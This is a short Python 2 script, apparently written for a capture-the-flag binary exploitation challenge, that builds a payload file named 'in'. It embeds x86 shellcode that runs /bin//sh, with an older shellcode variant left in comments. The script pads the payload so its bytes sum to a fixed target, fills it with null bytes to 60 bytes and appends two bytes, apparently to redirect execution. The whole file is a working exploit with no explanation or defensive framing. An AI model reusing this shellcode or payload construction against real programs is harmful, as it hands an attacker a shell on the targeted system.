#!/usr/bin/env python2

import os, sys

target = 0x1ee7

def sum(s):
    a = 0
    for i in s:
        a += ord(i)
    return a

#sc = open('sc')
#s = '\x90' + sc.read()
#s =  '\x90\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + ';'
s = '\x90' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

remain = target -  sum(s)
if remain < 0:
    print remain
    sys.exit(10)

s += chr(255) * (remain / 255)

if remain % 255 != 0:
    s += chr(remain%255)

s += chr(0) * (60-len(s))

s += '\x97\xc2'
print sum(s), len(s)

f = open('in', 'w')
f.write(s)
f.close()
